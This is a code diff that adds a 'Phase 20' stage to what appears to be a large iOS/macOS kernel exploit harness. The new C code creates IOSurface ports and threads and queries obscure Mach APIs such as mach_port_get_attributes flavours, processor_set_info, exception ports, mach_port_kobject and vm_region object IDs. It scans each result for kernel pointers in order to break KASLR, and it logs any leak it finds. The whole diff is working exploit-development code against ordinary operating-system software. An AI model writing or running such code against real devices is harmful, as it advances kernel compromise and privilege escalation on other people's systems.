@@ -22929,7 +22929,288 @@ new_modes:
             p19_done: ;
         }
 
+        /* ================================================================
+         * Phase 20 (r=229): Data-only KASLR via obscure Mach APIs
+         *
+         * mach_port_get_context returned KERN_PROTECTION_FAILURE (0x11) for
+         * IOSurface ports — Apple actively blocks it, implying the context
+         * contains a kernel address. Try other APIs that may leak port info.
+         *
+         * Also try: processor_set_info, thread exception ports,
+         * mach_port_get_attributes with various flavors.
+         * ================================================================ */
+        if (rounds == 229 && r229_matched_idx >= 0) {
+            rlog("\n=== Phase 20 (r=229): Obscure Mach API Probing ===\n");
+            uint64_t p20_leaked = 0;
 
+            /* 20a: IOSurface port - try mach_port_get_attributes */
+            rlog("  --- 20a: mach_port_get_attributes on IOSurface port ---\n");
+            {
+                /* Create a fresh surface + port for testing */
+                CFMutableDictionaryRef tp = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int tw = 32, th = 32, tbpr = 128, tas = 32*128, tpf = 0x42475241;
+                CFDictionarySetValue(tp, CFSTR("IOSurfaceWidth"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &tw));
+                CFDictionarySetValue(tp, CFSTR("IOSurfaceHeight"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &th));
+                CFDictionarySetValue(tp, CFSTR("IOSurfaceBytesPerRow"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &tbpr));
+                CFDictionarySetValue(tp, CFSTR("IOSurfaceAllocSize"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &tas));
+                CFDictionarySetValue(tp, CFSTR("IOSurfacePixelFormat"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &tpf));
+                IOSurfaceRef p20_surf = IOSurfaceCreate(tp);
+                CFRelease(tp);
+
+                if (p20_surf) {
+                    mach_port_t sp = IOSurfaceCreateMachPort(p20_surf);
+                    if (sp != MACH_PORT_NULL) {
+                        /* MACH_PORT_LIMITS_INFO (1) */
+                        mach_port_limits_t limits;
+                        mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
+                        kern_return_t kr = mach_port_get_attributes(mach_task_self(),
+                            sp, MACH_PORT_LIMITS_INFO,
+                            (mach_port_info_t)&limits, &cnt);
+                        rlog("  LIMITS: kr=0x%x qlimit=%u\n", kr, limits.mpl_qlimit);
+
+                        /* MACH_PORT_RECEIVE_STATUS (0) */
+                        mach_port_status_t status;
+                        cnt = MACH_PORT_RECEIVE_STATUS_COUNT;
+                        kr = mach_port_get_attributes(mach_task_self(),
+                            sp, MACH_PORT_RECEIVE_STATUS,
+                            (mach_port_info_t)&status, &cnt);
+                        rlog("  RECV_STATUS: kr=0x%x seqno=%u msgcount=%u\n",
+                             kr, status.mps_seqno, status.mps_msgcount);
+                        if (kr == KERN_SUCCESS) {
+                            rlog("    qlimit=%u mscount=%u sorights=%u\n",
+                                 status.mps_qlimit, status.mps_mscount,
+                                 status.mps_sorights);
+                            /* Scan for kernel pointers */
+                            uint64_t *sp2 = (uint64_t *)&status;
+                            for (unsigned qi = 0; qi < cnt; qi++) {
+                                if ((sp2[qi] >> 40) == 0xfffffe) {
+                                    rlog("  *** STATUS KPTR[%u]: 0x%016llx ***\n",
+                                         qi, (unsigned long long)sp2[qi]);
+                                    if (!p20_leaked) p20_leaked = sp2[qi];
+                                }
+                            }
+                        }
+
+                        /* MACH_PORT_INFO_EXT (9 on some XNU versions) */
+                        uint64_t ext_buf[32];
+                        memset(ext_buf, 0, sizeof(ext_buf));
+                        cnt = 32;
+                        kr = mach_port_get_attributes(mach_task_self(),
+                            sp, 9, (mach_port_info_t)ext_buf, &cnt);
+                        rlog("  INFO_EXT(9): kr=0x%x cnt=%u\n", kr, cnt);
+                        if (kr == KERN_SUCCESS) {
+                            for (unsigned qi = 0; qi < cnt; qi++) {
+                                if ((ext_buf[qi] >> 40) == 0xfffffe) {
+                                    rlog("  *** EXT KPTR[%u]: 0x%016llx ***\n",
+                                         qi, (unsigned long long)ext_buf[qi]);
+                                    if (!p20_leaked) p20_leaked = ext_buf[qi];
+                                }
+                            }
+                        }
+
+                        /* Try flavors 2-15 */
+                        for (int fl = 2; fl <= 15; fl++) {
+                            memset(ext_buf, 0, sizeof(ext_buf));
+                            cnt = 32;
+                            kr = mach_port_get_attributes(mach_task_self(),
+                                sp, fl, (mach_port_info_t)ext_buf, &cnt);
+                            if (kr == KERN_SUCCESS) {
+                                rlog("  flavor %d: kr=0x%x cnt=%u\n", fl, kr, cnt);
+                                for (unsigned qi = 0; qi < cnt; qi++) {
+                                    if ((ext_buf[qi] >> 40) == 0xfffffe) {
+                                        rlog("  *** F%d KPTR[%u]: 0x%016llx ***\n",
+                                             fl, qi, (unsigned long long)ext_buf[qi]);
+                                        if (!p20_leaked) p20_leaked = ext_buf[qi];
+                                    }
+                                }
+                            }
+                        }
+
+                        mach_port_deallocate(mach_task_self(), sp);
+                    }
+                    CFRelease(p20_surf);
+                }
+            }
+
+            /* 20b: processor_set_info */
+            rlog("\n  --- 20b: processor_set_info ---\n");
+            {
+                processor_set_name_port_t pset;
+                kern_return_t kr = processor_set_default(mach_host_self(), &pset);
+                rlog("  default pset: kr=0x%x port=0x%x\n", kr, pset);
+                if (kr == KERN_SUCCESS && pset != MACH_PORT_NULL) {
+                    /* PROCESSOR_SET_BASIC_INFO (5) */
+                    struct processor_set_basic_info binfo;
+                    mach_msg_type_number_t cnt = PROCESSOR_SET_BASIC_INFO_COUNT;
+                    kr = processor_set_info(pset, PROCESSOR_SET_BASIC_INFO,
+                        &pset, (processor_set_info_t)&binfo, &cnt);
+                    rlog("  BASIC: kr=0x%x count=%u\n", kr, binfo.processor_count);
+
+                    /* PROCESSOR_SET_LOAD_INFO (4) */
+                    struct processor_set_load_info linfo;
+                    cnt = PROCESSOR_SET_LOAD_INFO_COUNT;
+                    kr = processor_set_info(pset, PROCESSOR_SET_LOAD_INFO,
+                        &pset, (processor_set_info_t)&linfo, &cnt);
+                    rlog("  LOAD: kr=0x%x mach_factor=%u\n", kr, linfo.mach_factor);
+
+                    /* Scan raw data for pointers */
+                    uint64_t *bp = (uint64_t *)&linfo;
+                    for (unsigned qi = 0; qi < cnt; qi++) {
+                        if ((bp[qi] >> 40) == 0xfffffe) {
+                            rlog("  *** PSET KPTR[%u]: 0x%016llx ***\n",
+                                 qi, (unsigned long long)bp[qi]);
+                            if (!p20_leaked) p20_leaked = bp[qi];
+                        }
+                    }
+                }
+            }
+
+            /* 20c: thread exception ports */
+            rlog("\n  --- 20c: thread exception ports ---\n");
+            {
+                exception_mask_t masks[32];
+                mach_msg_type_number_t cnt = 32;
+                exception_handler_t handlers[32];
+                exception_behavior_t behaviors[32];
+                thread_state_flavor_t flavors[32];
+
+                kern_return_t kr = task_get_exception_ports(mach_task_self(),
+                    EXC_MASK_ALL, masks, &cnt, handlers, behaviors, flavors);
+                rlog("  task exception ports: kr=0x%x cnt=%u\n", kr, cnt);
+                for (unsigned i = 0; i < cnt; i++) {
+                    if (handlers[i] != MACH_PORT_NULL) {
+                        mach_port_context_t ctx = 0;
+                        mach_port_get_context(mach_task_self(), handlers[i], &ctx);
+                        natural_t kotype = 0;
+                        mach_vm_address_t koaddr = 0;
+                        mach_port_kobject(mach_task_self(), handlers[i],
+                            &kotype, (mach_port_t *)&koaddr);
+                        rlog("  exc[%u]: mask=0x%x port=0x%x ctx=0x%llx ko=%u/0x%llx\n",
+                             i, masks[i], handlers[i],
+                             (unsigned long long)ctx, kotype,
+                             (unsigned long long)koaddr);
+                        if ((ctx >> 40) == 0xfffffe && !p20_leaked)
+                            p20_leaked = ctx;
+                        if ((koaddr >> 40) == 0xfffffe && !p20_leaked)
+                            p20_leaked = koaddr;
+                    }
+                }
+            }
+
+            /* 20d: Scan multiple vm_region object_ids for pattern */
+            rlog("\n  --- 20d: vm_region object_id analysis ---\n");
+            {
+                /* Create surfaces of different sizes and check object_ids */
+                uint32_t oids[8];
+                IOSurfaceRef osurfs[8];
+                int sizes[] = {4096, 8192, 16384, 32768, 65536, 131072, 262144, 524288};
+                for (int i = 0; i < 8; i++) {
+                    CFMutableDictionaryRef tp = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int tw = 32, th = sizes[i] / 128, tbpr = 128;
+                    CFDictionarySetValue(tp, CFSTR("IOSurfaceWidth"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &tw));
+                    CFDictionarySetValue(tp, CFSTR("IOSurfaceHeight"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &th));
+                    CFDictionarySetValue(tp, CFSTR("IOSurfaceBytesPerRow"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &tbpr));
+                    CFDictionarySetValue(tp, CFSTR("IOSurfaceAllocSize"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &sizes[i]));
+                    int pf = 0x42475241;
+                    CFDictionarySetValue(tp, CFSTR("IOSurfacePixelFormat"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &pf));
+                    osurfs[i] = IOSurfaceCreate(tp);
+                    CFRelease(tp);
+                    oids[i] = 0;
+
+                    if (osurfs[i]) {
+                        void *base = IOSurfaceGetBaseAddress(osurfs[i]);
+                        if (base) {
+                            mach_vm_address_t addr = (mach_vm_address_t)(uintptr_t)base;
+                            mach_vm_size_t rsize = 0;
+                            uint32_t depth = 0;
+                            struct vm_region_submap_info_64 info;
+                            mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                            kern_return_t kr = mach_vm_region_recurse(mach_task_self(),
+                                &addr, &rsize, &depth,
+                                (vm_region_recurse_info_t)&info, &cnt);
+                            if (kr == KERN_SUCCESS)
+                                oids[i] = info.object_id;
+                        }
+                    }
+                }
+                rlog("  object_ids: ");
+                for (int i = 0; i < 8; i++)
+                    rlog("0x%08x ", oids[i]);
+                rlog("\n");
+
+                /* Check if object_ids have common high bits (partial kernel addr) */
+                uint32_t common_hi = oids[0] & 0xFFFF0000;
+                int same_hi = 0;
+                for (int i = 1; i < 8; i++)
+                    if ((oids[i] & 0xFFFF0000) == common_hi) same_hi++;
+                rlog("  Common high 16 bits: 0x%04x (%d/8 match)\n",
+                     common_hi >> 16, same_hi + 1);
+
+                /* Check if differences between consecutive IDs are small (sequential alloc) */
+                for (int i = 0; i < 7; i++) {
+                    if (oids[i] && oids[i+1]) {
+                        int32_t diff = (int32_t)oids[i+1] - (int32_t)oids[i];
+                        rlog("  delta[%d→%d]: %d (0x%x)\n", i, i+1, diff, (uint32_t)diff);
+                    }
+                }
+
+                for (int i = 0; i < 8; i++)
+                    if (osurfs[i]) CFRelease(osurfs[i]);
+            }
+
+            /* 20e: Check task_threads for thread port kobjects */
+            rlog("\n  --- 20e: task_threads port probing ---\n");
+            {
+                thread_act_array_t threads;
+                mach_msg_type_number_t tcnt;
+                kern_return_t kr = task_threads(mach_task_self(), &threads, &tcnt);
+                rlog("  task_threads: kr=0x%x count=%u\n", kr, tcnt);
+                if (kr == KERN_SUCCESS) {
+                    for (unsigned i = 0; i < tcnt && i < 5; i++) {
+                        natural_t kotype = 0;
+                        mach_vm_address_t koaddr = 0;
+                        mach_port_kobject(mach_task_self(), threads[i],
+                            &kotype, (mach_port_t *)&koaddr);
+                        mach_port_context_t ctx = 0;
+                        mach_port_get_context(mach_task_self(), threads[i], &ctx);
+                        rlog("  thread[%u]: ko_type=%u ko_addr=0x%llx ctx=0x%llx\n",
+                             i, kotype, (unsigned long long)koaddr,
+                             (unsigned long long)ctx);
+                        if ((koaddr >> 40) == 0xfffffe && !p20_leaked)
+                            p20_leaked = koaddr;
+                        if ((ctx >> 40) == 0xfffffe && !p20_leaked)
+                            p20_leaked = ctx;
+                    }
+                    for (unsigned i = 0; i < tcnt; i++)
+                        mach_port_deallocate(mach_task_self(), threads[i]);
+                    vm_deallocate(mach_task_self(),
+                        (vm_address_t)threads, tcnt * sizeof(thread_act_t));
+                }
+            }
+
+            /* === Phase 20 Summary === */
+            rlog("\n=== Phase 20 Summary ===\n");
+            if (p20_leaked) {
+                rlog("*** KASLR LEAK FOUND: 0x%016llx ***\n",
+                     (unsigned long long)p20_leaked);
+            } else {
+                rlog("No kernel pointer via obscure Mach APIs.\n");
+                rlog("Moving to data-only approach (no KASLR needed).\n");
+            }
+            rlog("--- Phase 20 complete ---\n");
+        }
 
 
         /*
